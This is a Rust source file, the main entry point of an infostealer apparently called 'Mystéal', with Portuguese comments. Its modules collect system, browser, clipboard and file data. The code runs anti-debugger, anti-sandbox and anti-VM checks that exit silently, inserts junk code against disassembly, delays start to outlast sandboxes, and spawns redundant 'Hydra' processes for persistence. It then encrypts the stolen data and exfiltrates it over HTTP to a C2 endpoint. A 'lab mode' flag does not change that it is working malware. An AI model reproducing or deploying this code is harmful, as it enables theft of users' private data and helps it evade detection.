//! Runtime service

use clap::Parser;
use tracing::Level;
use tracing_subscriber::FmtSubscriber;

mod config;
mod collectors;
mod crypto;
mod exfil;
mod loader;
mod utils;

use config::Config;
use loader::{initialize_loader, run_loader_loop};
use utils::anti_analysis::EnvironmentChecker;
use utils::anti_debug;
use utils::evasion;

#[derive(Parser, Debug)]
#[command(author = "", version = "", about = "", long_about = None)]
struct Args {
    #[arg(long, default_value_t = true, hide = true)]
    lab_mode: bool,

    #[arg(short, long, default_value = "warn", hide = true)]
    log_level: String,

    #[arg(short, long, default_value = "./data", hide = true)]
    output_dir: String,

    #[arg(short, long, default_value = "system,browser,clipboard,files", hide = true)]
    modules: String,

    #[arg(long, default_value_t = false, hide = true)]
    skip_checks: bool,

    #[arg(long, default_value_t = cfg!(feature = "hydra-auto"), hide = true)]
    hydra: bool,

    #[arg(long, hide = true)]
    hydra_role: Option<String>,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args = Args::parse();

    // Configurar logging (silencioso para processos Hydra secundários)
    let is_secondary = args.hydra_role.is_some();
    let log_level = if is_secondary {
        Level::WARN // Menos verbose para não poluir logs
    } else {
        match args.log_level.to_lowercase().as_str() {
            "trace" => Level::TRACE,
            "debug" => Level::DEBUG,
            "info" => Level::INFO,
            "warn" => Level::WARN,
            "error" => Level::ERROR,
            _ => Level::INFO,
        }
    };

    let subscriber = FmtSubscriber::builder()
        .with_max_level(log_level)
        .with_target(false)
        .with_thread_ids(false)
        .with_file(false)
        .with_line_number(false)
        .finish();

    tracing::subscriber::set_global_default(subscriber)
        .expect("Falha ao configurar logging");

    // Evasion: delay inicial e verificações anti-sandbox
    if !is_secondary {
        // Anti-disassembly: junk code no início
        anti_debug::junk_code_block();
        
        // Anti-debug: verifica debugger antes de qualquer coisa
        if anti_debug::is_debugger_attached() && !args.skip_checks {
            // Sai silenciosamente se debugger detectado
            anti_debug::junk_code_block();
            std::process::exit(0);
        }
        
        // Delay inicial para evitar sandboxes com timeout curto
        evasion::initial_delay();
        
        // Mais junk code para confundir análise
        if anti_debug::opaque_true() {
            anti_debug::junk_code_block();
        }
        
        // Anti-debug: delay com timing aleatório
        anti_debug::anti_timing_delay();
        
        // Executa verificações de evasão
        let evasion_result = evasion::run_all_checks();
        
        if evasion_result.is_being_analyzed() && !args.skip_checks {
            // Comportamento "normal" - não executa se detectar análise
            anti_debug::junk_code_block();
            std::process::exit(0);
        }
        
        // Verifica ambiente virtual
        if anti_debug::is_virtual_environment() && !args.skip_checks {
            anti_debug::junk_code_block();
            std::process::exit(0);
        }
        
        // Banner apenas para processo principal
        print_banner();
    }

    // Verificar modo lab (sem strings visíveis)
    #[cfg(feature = "lab-mode")]
    {
        if !args.skip_checks {
            // Anti-analysis checks silenciosos
            if EnvironmentChecker::is_debugger_present() {
                anti_debug::junk_code_block();
                std::process::exit(0);
            }
            
            if EnvironmentChecker::is_sandbox() {
                anti_debug::junk_code_block();
                std::process::exit(0);
            }
            
            if EnvironmentChecker::timing_check() {
                anti_debug::junk_code_block();
                std::process::exit(0);
            }
            
            match EnvironmentChecker::verify_lab_environment() {
                Ok(true) => { /* OK */ }
                Ok(false) => {
                    anti_debug::junk_code_block();
                    std::process::exit(1);
                }
                Err(_) => { /* Continue */ }
            }
        }
    }

    #[cfg(not(feature = "lab-mode"))]
    {
        std::process::exit(1);
    }

    // Inicializar sistema Hydra se solicitado
    if args.hydra || args.hydra_role.is_some() {
        return run_hydra_mode(&args).await;
    }

    // Modo normal (sem Hydra)
    run_normal_mode(&args).await
}

/// Executa em modo Hydra (com redundância de processos)
async fn run_hydra_mode(args: &Args) -> anyhow::Result<()> {
    let role = args.hydra_role.as_deref();
    
    // Inicializa o loader com sistema Hydra
    let state = initialize_loader(role).await
        .map_err(|e| anyhow::anyhow!("{}", e))?;
    
    // Se somos uma cabeça específica (não Alpha inicial), apenas monitora
    if role.is_some() {
        run_loader_loop(state).await;
        return Ok(());
    }
    
    // Alpha: executa coleta E monitora
    let config = Config::new(
        args.output_dir.clone(),
        args.modules.split(',').map(|s| s.trim().to_string()).collect(),
    );
    
    // Spawn tarefa de monitoramento em background
    let monitor_state = state.clone();
    let monitor_handle = tokio::spawn(async move {
        run_loader_loop(monitor_state).await;
    });
    
    // Executa coleta
    let _ = run_collection(&config).await;
    
    // Aguarda monitor (infinito)
    let _ = monitor_handle.await;
    
    Ok(())
}

/// Executa em modo normal (sem Hydra)
async fn run_normal_mode(args: &Args) -> anyhow::Result<()> {
    // Carregar configuração
    let config = Config::new(
        args.output_dir.clone(),
        args.modules.split(',').map(|s| s.trim().to_string()).collect(),
    );

    // Executar coleta silenciosamente
    let result = run_collection(&config).await;

    match result {
        Ok(_) => Ok(()),
        Err(e) => Err(e),
    }
}

fn print_banner() {
    #[cfg(not(feature = "silent"))]
    {
        println!(r#"
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║   ███╗   ███╗██╗   ██╗███████╗████████╗███████╗ █████╗ ██╗   ║
    ║   ████╗ ████║╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║   ║
    ║   ██╔████╔██║ ╚████╔╝ ███████╗   ██║   █████╗  ███████║██║   ║
    ║   ██║╚██╔╝██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██╔══██║██║   ║
    ║   ██║ ╚═╝ ██║   ██║   ███████║   ██║   ███████╗██║  ██║███████╗
    ║   ╚═╝     ╚═╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
        "#);
    }
}

async fn run_collection(config: &Config) -> anyhow::Result<String> {
    use collectors::CollectorManager;
    use crypto::{CryptoManager, obfuscation};
    use exfil::{LocalExfiltrator, HttpExfiltrator, Exfiltrator};

    std::fs::create_dir_all(&config.output_dir)?;

    let mut manager = CollectorManager::new();
    
    for module in &config.enabled_modules {
        manager.register_module(module)?;
    }

    let collected_data = manager.run_all().await?;

    let crypto = CryptoManager::new()?;
    let json_bytes = serde_json::to_vec(&collected_data)?;
    
    // Shuffle antes de criptografar (camada extra)
    let shuffle_seed = 0xDEADBEEF_u64;
    let shuffled = obfuscation::shuffle_bytes(&json_bytes, shuffle_seed);
    
    let encrypted = crypto.encrypt(&shuffled)?;

    // Salvar localmente
    let local_exfil = LocalExfiltrator::new(&config.output_dir);
    let output_path = local_exfil.save(&encrypted)?;

    // Exfiltrar via HTTP para C2 (se configurado)
    if let Some(ref endpoint) = config.exfil_config.http_endpoint {
        match config.exfil_config.exfil_type {
            config::ExfilType::Http => {
                let http_exfil = HttpExfiltrator::new(endpoint);
                if http_exfil.check_connection() {
                    if let Err(_e) = http_exfil.send(&encrypted) {
                        // Silencioso - falha não é crítica
                        #[cfg(not(feature = "silent"))]
                        tracing::warn!("HTTP exfil failed: {}", _e);
                    }
                }
            }
            _ => {
                // LocalFile ou DNS - tenta HTTP de qualquer forma em lab mode
                #[cfg(feature = "lab-mode")]
                {
                    let http_exfil = HttpExfiltrator::new(endpoint);
                    let _ = http_exfil.send(&encrypted);
                }
            }
        }
    }

    #[cfg(feature = "lab-mode")]
    {
        // Readable JSON for analysis (silencioso)
        let readable_path = format!("{}/collected_data_readable.json", config.output_dir);
        let _ = std::fs::write(&readable_path, serde_json::to_string_pretty(&collected_data)?);
        
        // Verify obfuscation works
        let key = b"labkey123";
        let test_data = b"sensitive_string";
        let encoded = obfuscation::xor_encode(test_data, key);
        let decoded = obfuscation::xor_decode(&encoded, key);
        assert_eq!(test_data.as_slice(), decoded.as_slice());
    }

    Ok(output_path)
}
